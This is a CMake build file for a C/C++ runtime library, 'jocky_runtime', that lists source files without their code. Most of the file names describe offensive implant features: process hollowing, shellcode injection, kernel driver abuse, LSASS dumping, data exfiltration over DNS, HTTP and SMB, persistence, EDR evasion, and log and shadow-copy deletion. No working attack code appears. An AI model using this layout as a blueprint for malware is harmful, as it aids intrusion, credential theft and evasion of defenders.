cmake_minimum_required(VERSION 3.16)
project(jocky_runtime C CXX)

set(CMAKE_C_STANDARD 11)
set(CMAKE_CXX_STANDARD 14)

# Shared runtime source files (cross-platform safe)
set(SHARED_SOURCES
    ai/mutation_engine.c
    common/encoding.c
    compression/compression.c
    compression/compression_simple.c
    core/plugin.c
    core/sandbox.c
    crypto/crypto.c
    exploitation/linux_kernel.c
    init/anti_analysis.c
    io/io.c
    memory/vmem.c
    network/network.c
    obfuscation.c
    sysinfo.c
    util/mem.c
    vm/vm_interpreter.c
)

# Forensic analysis pipeline (Kamimi) - all platforms
set(FORENSIC_SOURCES
    forensics/forensic_engine.c
    forensics/forensics_rt.c
    forensics/forensic_utils.c
    forensics/jocky_forensics_rt_v2.c
    forensics/audit/audit_log.c
    forensics/control/capabilities.c
    forensics/engine/analysis.c
    forensics/engine/provenance.c
    forensics/plugins/collectors/evtx_collector.c
    forensics/plugins/collectors/file_collector.c
    forensics/plugins/collectors/memory_collector.c
    forensics/plugins/collectors/mft_collector.c
    forensics/plugins/collectors/network_collector.c
    forensics/plugins/collectors/prefetch_collector.c
    forensics/plugins/collectors/process_collector.c
    forensics/plugins/collectors/registry_collector.c
    forensics/plugins/collectors/usnjrnl_collector.c
    forensics/plugins/output/html_output.c
    forensics/plugins/output/json_output.c
    forensics/plugins/output/siem_forwarder.c
    forensics/plugins/output/sigma_output.c
    forensics/plugins/output/stix_output.c
    forensics/plugins/parsers/arp_parser.c
    forensics/plugins/parsers/dns_parser.c
    forensics/plugins/parsers/elf_parser.c
    forensics/plugins/parsers/evtx_parser.c
    forensics/plugins/parsers/file_parser.c
    forensics/plugins/parsers/memory_parser.c
    forensics/plugins/parsers/mft_parser.c
    forensics/plugins/parsers/network_parser.c
    forensics/plugins/parsers/prefetch_parser.c
    forensics/plugins/parsers/process_parser.c
    forensics/plugins/parsers/registry_parser.c
    forensics/store/evidence_store.c
)

# Linux runtime source files (55 files)
set(LINUX_SOURCES
    linux/syscalls/syscall.c
    linux/syscalls/sysinfo_syscall.c
    linux/syscalls/env_syscall.c
    linux/syscalls/file_syscall.c
    linux/syscalls/dir_syscall.c
    linux/syscalls/mem_syscall.c
    linux/syscalls/signal_syscall.c
    linux/syscalls/ipc_syscall.c
    linux/syscalls/util_syscall.c
    linux/process/process_syscall.c
    linux/process/process_control_syscall.c
    linux/process/hollow.c
    linux/process/process_hollow.c
    linux/process/advanced_process_ops.c
    linux/process/ptrace_control.c
    linux/process/thread_hijack.c
    linux/kernel/lkm_loader.c
    linux/kernel/lkm_loader.cpp
    linux/kernel/ebpf_loader.c
    linux/kernel/ebpf_evasion.cpp
    linux/kernel/ftrace_helper.c
    linux/kernel/ftrace_hooking.cpp
    linux/kernel/modules.c
    linux/kernel/advanced_syscalls.c
    linux/kernel/advanced_kernel_ops.c
    linux/kernel/module_loader.c
    linux/kernel/module_ops.c
    linux/kernel/kread_kwrite.c
    linux/kernel/byovd_ops.c
    linux/anti_analysis/artifact_hiding.cpp
    linux/anti_analysis/userland_evasion.cpp
    linux/anti_analysis/anti_analysis.c
    linux/anti_analysis/detection.c
    linux/lpe/privilege_escalation.cpp
    linux/lpe/fence2pwn.c
    linux/core/audit_ops.c
    linux/core/runtime_init.c
    linux/core/sandbox_ops.c
    linux/persistence.c
    linux/persistence/cron_systemd.c
    linux/exfil/exfil_channels.c
    linux/io/io_core.c
    linux/threading/threadpool.c
    linux/networking/network.c
    linux/forensics/linux_forensics.c
    linux/forensics/cleanup.c
    linux/missing_apis.c
)

# Windows runtime source files
set(WINDOWS_SOURCES
    byovd/byovd_manifest.c
    byovd/byovd_modular.c
    byovd/driver_scoring.c
    exfil/exfil.c
    exfil/lsass_dump.c
    pack/stub_loader.c
    win_wrapper.c
    windows/evasion/edr_throttle_profiler.c
    windows/anti_forensics/cleanup_artifacts.c
    windows/anti_forensics/event_log_cleanup.c
    windows/anti_forensics/registry_cleanup.c
    windows/anti_forensics/temp_cleanup.c
    windows/anti_forensics/shadow_copy_delete.c
    windows/apis/winapi_wrappers.c
    windows/audit/eventlog_audit.c
    windows/audit/registry_audit.c
    windows/execution/execute_shellcode.c
    windows/execution/hollowing.c
    windows/execution/injector.c
    windows/exfil/smb_exfil.c
    windows/exfil/dns_exfil.c
    windows/exfil/http_exfil.c
    windows/exploitation/exploit_runner.c
    windows/forensics/volatility_dump.c
    windows/forensics/memory_forensics.c
    windows/kernel/driver_communication.c
    windows/kernel/kernel_read_write.c
    windows/network/socket_utils.c
    windows/network/http_client.c
    windows/registry/registry_ops.c
    windows/registry/registry_query.c
    windows/security/acl_manipulation.c
    windows/security/privilege_escalation.c
    windows/threading/thread_pool.c
    windows/threading/thread_management.c
)

# Combine all sources
set(RUNTIME_SOURCES
    ${SHARED_SOURCES}
    ${FORENSIC_SOURCES}
)

# Add platform-specific sources
if(WIN32)
    list(APPEND RUNTIME_SOURCES ${WINDOWS_SOURCES})
else()
    list(APPEND RUNTIME_SOURCES ${LINUX_SOURCES})
endif()

# Static library
add_library(jocky_rt STATIC ${RUNTIME_SOURCES})
target_include_directories(jocky_rt PUBLIC include)

if(WIN32)
    target_link_libraries(jocky_rt PUBLIC ntdll winhttp dnsapi wevtapi)
else()
    # Linux: link against libdl for dlopen/dlsym
    target_link_libraries(jocky_rt PUBLIC dl)
endif()

# Example: build a test executable
# add_executable(rt_test tests/rt_test.c)
# target_link_libraries(rt_test jocky_rt)
